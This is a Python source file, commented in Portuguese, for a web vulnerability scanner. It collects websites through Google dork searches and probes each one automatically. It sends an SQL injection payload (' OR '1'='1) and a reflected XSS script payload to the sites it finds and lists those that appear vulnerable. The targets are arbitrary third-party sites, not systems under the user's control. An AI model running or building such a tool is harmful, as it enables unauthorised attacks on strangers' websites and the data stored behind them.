from googlesearch import search
import requests
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode



class WebVulnerabilityScanner:
    def __init__(self, user_agent="Mozilla/5.0"):
        """
        Inicializa o scanner de vulnerabilidades web.

        :param user_agent: User-Agent a ser usado nas requisições HTTP.
        """
        self.user_agent = user_agent

    def google_dork_search(self, dork, num_results=10):
        """
        Realiza uma pesquisa no Google usando uma dork.

        :param dork: A dork a ser pesquisada (ex: 'inurl:admin.php').
        :param num_results: Número de resultados a serem retornados.
        :return: Lista de URLs encontrados.
        """
        try:
            # Realiza a pesquisa no Google
            results = list(search(dork, num=num_results, stop=num_results, pause=2))
            return results
        except Exception as e:
            print(f"Erro ao realizar a pesquisa: {e}")
            return []

    def check_sql_injection(self, url):
        # Parse the original URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # Add or modify the 'id' parameter with SQL payload
        params['id'] = ["' OR '1'='1"]
        new_query = urlencode(params, doseq=True)

        # Rebuild the URL
        rebuilt_url = urlunparse(parsed._replace(query=new_query))

        # Make the request (using requests.get as before)
        response = requests.get(rebuilt_url, headers={"User-Agent": "Mozilla/5.0"})
        return "SQL syntax" in response.text

    def scan_with_dorks(self, dork, num_results=10):
        """
        Escaneia sites encontrados com uma dork em busca de vulnerabilidades.

        :param dork: A dork a ser pesquisada.
        :param num_results: Número de resultados a serem verificados.
        :return: Lista de URLs vulneráveis.
        """
        vulnerable_urls = []
        urls = self.google_dork_search(dork, num_results)

        for url in urls:
            print(f"Verificando {url}...")
            if self.check_sql_injection(url):
                print(f"Vulnerabilidade encontrada em: {url}")
                vulnerable_urls.append(url)

        return vulnerable_urls

    def check_xss(self, url):
        """
        Verifica se uma URL é vulnerável a XSS.

        :param url: A URL a ser verificada.
        :return: True se vulnerável, False caso contrário.
        """
        try:
            # Adiciona um payload de XSS à URL
            payload = "<script>alert('XSS')</script>"
            test_url = f"{url}?q={payload}"

            # Faz a requisição HTTP
            headers = {"User-Agent": self.user_agent}
            response = requests.get(test_url, headers=headers)

            # Verifica se o payload foi refletido na resposta
            if payload in response.text:
                return True
            return False
        except Exception as e:
            print(f"Erro ao verificar XSS: {e}")
            return False